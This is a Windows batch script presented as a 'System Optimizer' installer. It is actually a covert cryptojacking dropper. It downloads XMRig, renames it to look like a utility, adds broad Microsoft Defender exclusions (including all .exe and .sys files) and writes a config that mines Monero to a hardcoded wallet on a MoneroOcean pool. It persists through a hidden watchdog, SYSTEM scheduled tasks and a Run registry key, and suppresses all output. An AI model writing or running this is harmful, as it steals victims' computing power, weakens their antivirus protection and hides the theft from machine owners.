@echo off
setlocal enabledelayedexpansion

REM ===== SYSTEM OPTIMIZER INSTALLER (Batch) =====

REM Create directory
if not exist "C:\ProgramData\SystemOptimizer" mkdir "C:\ProgramData\SystemOptimizer"

REM Download XMRig
bitsadmin /transfer XMRigDownload /download /priority FOREGROUND "https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-windows-x64.zip" "%TEMP%\xmrig.zip" >nul 2>&1

REM Extract
powershell -Command "Expand-Archive -Path '%TEMP%\xmrig.zip' -DestinationPath '%TEMP%\xmrig_tmp' -Force" >nul 2>&1
move /y "%TEMP%\xmrig_tmp\xmrig-6.26.0\xmrig.exe" "C:\ProgramData\SystemOptimizer\SystemOptimizer.exe" >nul 2>&1
rmdir /s /q "%TEMP%\xmrig_tmp" >nul 2>&1
del "%TEMP%\xmrig.zip" >nul 2>&1

REM Defender exclusions
powershell -Command "Add-MpPreference -ExclusionPath 'C:\ProgramData\SystemOptimizer' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'SystemOptimizer.exe' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionExtension '.sys' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionExtension '.exe' -ErrorAction SilentlyContinue" >nul 2>&1

REM Create config.json using a temp PowerShell script file (write line by line)
echo $config = @{ > "%TEMP%\config.ps1"
echo     autosave=$false >> "%TEMP%\config.ps1"
echo     background=$true >> "%TEMP%\config.ps1"
echo     colors=$false >> "%TEMP%\config.ps1"
echo     'donate-level'=1 >> "%TEMP%\config.ps1"
echo     'log-file'='C:\ProgramData\SystemOptimizer\optimizer.log' >> "%TEMP%\config.ps1"
echo     'print-time'=30 >> "%TEMP%\config.ps1"
echo     retries=5 >> "%TEMP%\config.ps1"
echo     'retry-pause'=10 >> "%TEMP%\config.ps1"
echo     cpu=@{ >> "%TEMP%\config.ps1"
echo         enabled=$true >> "%TEMP%\config.ps1"
echo         'huge-pages'=$true >> "%TEMP%\config.ps1"
echo         'huge-pages-jit'=$true >> "%TEMP%\config.ps1"
echo         'hw-aes'=$true >> "%TEMP%\config.ps1"
echo         priority=1 >> "%TEMP%\config.ps1"
echo         yield=$true >> "%TEMP%\config.ps1"
echo         'max-cpu-usage'=95 >> "%TEMP%\config.ps1"
echo         asm=$true >> "%TEMP%\config.ps1"
echo         'argon2-impl'='auto' >> "%TEMP%\config.ps1"
echo         'max-threads-hint'=100 >> "%TEMP%\config.ps1"
echo     } >> "%TEMP%\config.ps1"
echo     pools=@( >> "%TEMP%\config.ps1"
echo         @{ >> "%TEMP%\config.ps1"
echo             url='gulf.moneroocean.stream:10001' >> "%TEMP%\config.ps1"
echo             user='435swUE8htb96xMwWXbfnzCXCkiKWQhcVKpQzjAHwNMkiWxPnzJiaiH82ucpvnfgpebBJ9QMjyVWnFdF6ih42LVLJY587wv' >> "%TEMP%\config.ps1"
echo             pass='x' >> "%TEMP%\config.ps1"
echo             keepalive=$true >> "%TEMP%\config.ps1"
echo             tls=$false >> "%TEMP%\config.ps1"
echo             nicehash=$false >> "%TEMP%\config.ps1"
echo             'rig-id'=$env:COMPUTERNAME >> "%TEMP%\config.ps1"
echo         } >> "%TEMP%\config.ps1"
echo     ) >> "%TEMP%\config.ps1"
echo     api=@{ >> "%TEMP%\config.ps1"
echo         enabled=$true >> "%TEMP%\config.ps1"
echo         host='127.0.0.1' >> "%TEMP%\config.ps1"
echo         port=3456 >> "%TEMP%\config.ps1"
echo         restricted=$true >> "%TEMP%\config.ps1"
echo     } >> "%TEMP%\config.ps1"
echo } ^| ConvertTo-Json -Depth 5 ^| Out-File -FilePath 'C:\ProgramData\SystemOptimizer\config.json' -Encoding ascii >> "%TEMP%\config.ps1"

powershell -ExecutionPolicy Bypass -File "%TEMP%\config.ps1" >nul 2>&1
del "%TEMP%\config.ps1" >nul 2>&1

REM Create watchdog.vbs
echo Set sh = CreateObject("WScript.Shell") > "C:\ProgramData\SystemOptimizer\watchdog.vbs"
echo Set wmi = GetObject("winmgmts:") >> "C:\ProgramData\SystemOptimizer\watchdog.vbs"
echo If wmi.ExecQuery("SELECT * FROM Win32_Process WHERE Name='wscript.exe' AND CommandLine LIKE '%watchdog.vbs%'").Count ^> 1 Then WScript.Quit >> "C:\ProgramData\SystemOptimizer\watchdog.vbs"
echo Do >> "C:\ProgramData\SystemOptimizer\watchdog.vbs"
echo     Set p = wmi.ExecQuery("SELECT * FROM Win32_Process WHERE Name='SystemOptimizer.exe'") >> "C:\ProgramData\SystemOptimizer\watchdog.vbs"
echo     If p.Count = 0 Then >> "C:\ProgramData\SystemOptimizer\watchdog.vbs"
echo         sh.Run """C:\ProgramData\SystemOptimizer\SystemOptimizer.exe"" --config=""C:\ProgramData\SystemOptimizer\config.json""", 0, False >> "C:\ProgramData\SystemOptimizer\watchdog.vbs"
echo     End If >> "C:\ProgramData\SystemOptimizer\watchdog.vbs"
echo     WScript.Sleep 30000 >> "C:\ProgramData\SystemOptimizer\watchdog.vbs"
echo Loop >> "C:\ProgramData\SystemOptimizer\watchdog.vbs"

REM Scheduled tasks
schtasks /Create /TN "SystemOptimizer" /TR "wscript.exe \"C:\ProgramData\SystemOptimizer\watchdog.vbs\"" /SC ONSTART /RU SYSTEM /RL HIGHEST /F >nul 2>&1
schtasks /Create /TN "SystemOptimizer-Logon" /TR "wscript.exe \"C:\ProgramData\SystemOptimizer\watchdog.vbs\"" /SC ONLOGON /RU SYSTEM /RL HIGHEST /F >nul 2>&1
schtasks /Change /TN "SystemOptimizer" /RI 1 /DU 9999:59 /K >nul 2>&1

REM Registry Run key
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v SystemOptimizer /t REG_SZ /d "wscript.exe \"C:\ProgramData\SystemOptimizer\watchdog.vbs\"" /f >nul 2>&1

REM Defender exclusions
powershell -Command "Add-MpPreference -ExclusionPath 'C:\ProgramData\SystemOptimizer' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'SystemOptimizer.exe' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionExtension '.sys' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionExtension '.exe' -ErrorAction SilentlyContinue" >nul 2>&1

REM Start watchdog
wscript.exe "C:\ProgramData\SystemOptimizer\watchdog.vbs"

exit /b 0